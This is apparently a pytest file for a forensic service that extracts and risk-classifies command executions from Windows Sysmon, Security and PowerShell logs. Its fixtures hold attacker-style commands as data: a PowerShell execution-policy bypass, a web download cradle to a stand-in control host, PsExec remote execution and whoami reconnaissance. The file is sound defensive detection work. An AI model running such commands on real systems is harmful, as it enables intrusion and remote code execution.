from __future__ import annotations

from app.services import command_history


def _event(event_id: int, **overrides):
    base = {
        "id": f"event-{event_id}",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "@timestamp": "2024-03-22T12:00:00Z",
        "host": {"name": "hosta.examplecorp.local"},
        "user": {"name": "EXAMPLECORP\\usera"},
        "windows": {"event_id": event_id},
        "event": {"provider": "Microsoft-Windows-Sysmon", "channel": "Microsoft-Windows-Sysmon/Operational"},
        "artifact": {"type": "windows_event", "parser": "evtxecmd_csv"},
        "source_file": "Sysmon.evtx",
    }
    base.update(overrides)
    return base


def test_sysmon_event_id_1_extracts_command_execution() -> None:
    items = command_history._commands_from_event(
        "case-1",
        _event(
            1,
            process={
                "name": "powershell.exe",
                "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -ep bypass -File C:\\Users\\Public\\maintenance.ps1",
                "guid": "{PROC-1}",
                "pid": 4444,
                "parent": {"name": "explorer.exe", "command_line": "explorer.exe"},
            },
        ),
    )

    assert len(items) == 1
    item = items[0]
    assert item["source_type"] == "sysmon_1"
    assert item["shell"] == "powershell"
    assert item["shell_family"] == "powershell"
    assert item["launcher"] == "powershell.exe"
    assert item["classification_confidence"] == "high"
    assert "maintenance.ps1" in item["command"]
    assert item["confidence"] == "high"
    assert "PowerShell execution policy bypass" in item["risk_reasons"]


def test_security_4688_extracts_command_execution() -> None:
    items = command_history._commands_from_event(
        "case-1",
        _event(
            4688,
            event={"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security"},
            process={"name": "cmd.exe", "command_line": "cmd.exe /c whoami", "pid": 1234},
        ),
    )

    assert items[0]["source_type"] == "security_4688"
    assert items[0]["shell"] == "cmd"
    assert items[0]["shell_family"] == "cmd"
    assert items[0]["launcher"] == "cmd.exe"
    assert items[0]["command"] == "cmd.exe /c whoami"
    assert "reconnaissance command" in items[0]["risk_reasons"]


def test_powershell_4104_extracts_script_block() -> None:
    items = command_history._commands_from_event(
        "case-1",
        _event(
            4104,
            event={"provider": "Microsoft-Windows-PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational"},
            powershell={"command": "Invoke-WebRequest http://example-control.test/maintenance.ps1"},
        ),
    )

    assert items[0]["source_type"] == "powershell_operational"
    assert items[0]["shell"] == "powershell"
    assert items[0]["shell_family"] == "powershell"
    assert "download cradle or file transfer utility" in items[0]["risk_reasons"]
    assert "Synthetic indicator" in items[0]["risk_reasons"]


def test_dedupes_same_process_guid_and_preserves_supporting_events() -> None:
    first = command_history._commands_from_event(
        "case-1",
        _event(1, id="sysmon", process={"name": "whoami.exe", "command_line": "whoami.exe", "guid": "{GUID-1}"}),
    )[0]
    second = command_history._commands_from_event(
        "case-1",
        _event(
            4688,
            id="security",
            event={"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security"},
            process={"name": "whoami.exe", "command_line": "whoami.exe", "guid": "{GUID-1}"},
        ),
    )[0]

    deduped = command_history._dedupe_commands([second, first])

    assert len(deduped) == 1
    assert deduped[0]["source_type"] == "sysmon_1"
    assert {event["event_id"] for event in deduped[0]["supporting_events"]} == {"sysmon", "security"}


def test_filters_host_alias_risk_and_source_type() -> None:
    item = command_history._commands_from_event(
        "case-1",
        _event(1, process={"name": "powershell.exe", "command_line": "powershell.exe -ep bypass", "guid": "{GUID-1}"}),
    )[0]

    assert command_history._apply_filters([item], {"host": "HOSTA", "risk_min": 30, "source_type": "sysmon_1"})
    assert command_history._apply_filters([item], {"family": "powershell", "launcher": "powershell"})
    assert command_history._apply_filters([item], {"host": "other"}) == []


def test_get_command_history_uses_search_documents(monkeypatch) -> None:
    monkeypatch.setattr(command_history, "get_events_index", lambda case_id: f"events-{case_id}")
    monkeypatch.setattr(
        command_history,
        "search_documents",
        lambda index, body: {
            "hits": {
                "hits": [
                    {
                        "_id": "event-1",
                        "_source": _event(
                            1,
                            id=None,
                            process={"name": "powershell.exe", "command_line": "powershell.exe -ep bypass", "guid": "{GUID-1}"},
                        ),
                    }
                ]
            }
        },
    )

    response = command_history.get_command_history("case-1", {"host": "HOSTA", "page_size": 10})

    assert response["total"] == 1
    assert response["items"][0]["source_type"] == "sysmon_1"
    assert response["facets"]["shell"]["powershell"] == 1
    assert response["facets"]["family"]["powershell"] == 1
    assert response["facets"]["launcher"]["powershell.exe"] == 1


def test_lolbin_remote_exec_discovery_and_prefetch_classification() -> None:
    rundll32 = command_history._commands_from_event(
        "case-1",
        _event(1, process={"name": "rundll32.exe", "command_line": "rundll32.exe shell32.dll,Control_RunDLL", "guid": "{GUID-R}"}),
    )[0]
    psexec = command_history._commands_from_event(
        "case-1",
        _event(1, process={"name": "cmd.exe", "command_line": r"/c C:\Users\public\psexec.exe \\HOSTB -accepteula powershell -ep bypass", "guid": "{GUID-P}"}),
    )[0]
    whoami = command_history._commands_from_event(
        "case-1",
        _event(4688, event={"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security"}, process={"name": "whoami.exe", "command_line": "whoami.exe", "parent": {"name": "cmd.exe"}}),
    )[0]
    prefetch = command_history._commands_from_event(
        "case-1",
        _event(0, artifact={"type": "prefetch", "parser": "pecmd"}, process={"name": "POWERSHELL.EXE"}, key_entity="POWERSHELL.EXE"),
    )[0]

    assert rundll32["shell_family"] == "lolbin"
    assert psexec["shell_family"] == "remote_exec"
    assert whoami["shell_family"] == "binary_execution"
    assert whoami["parent_shell"] == "cmd"
    assert prefetch["launcher"] == "powershell.exe"
    assert prefetch["shell_family"] == "powershell"
    assert prefetch["classification_confidence"] in {"low", "medium"}
